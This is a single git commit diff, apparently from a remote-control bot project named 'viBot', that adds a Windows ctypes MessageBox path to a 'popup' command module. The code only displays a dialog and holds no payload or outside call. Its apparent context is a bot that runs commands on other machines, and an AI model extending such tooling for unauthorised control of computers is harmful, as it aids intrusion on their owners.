fe6107e4b9d5c6bd74d8f3e711fb1fc5dfe38be4
Black Viking <blackvkng@yandex.com>
2017-06-23 13:20:16 +0000

    viBot Project

--- modules/popup.py
+++ modules/popup.py
@@ -7,13 +7,18 @@
 
 __author__ = "blackvkng"
 
+import os
 import Tkinter as tk
 import tkMessageBox as messagebox
 
 usage = "[?] Popup module usage: popup TEXT"
 
 def run(message):
-	root = tk.Tk()
-	root.withdraw()
-	messagebox.showinfo(message, message)
-	root.destroy()
+	if os.name == "nt":
+		import ctypes
+		ctypes.windll.user32.MessageBoxA(None, message, message, 0)
+	else:
+		root = tk.Tk()
+		root.withdraw()
+		messagebox.showinfo(message, message)
+		root.destroy()
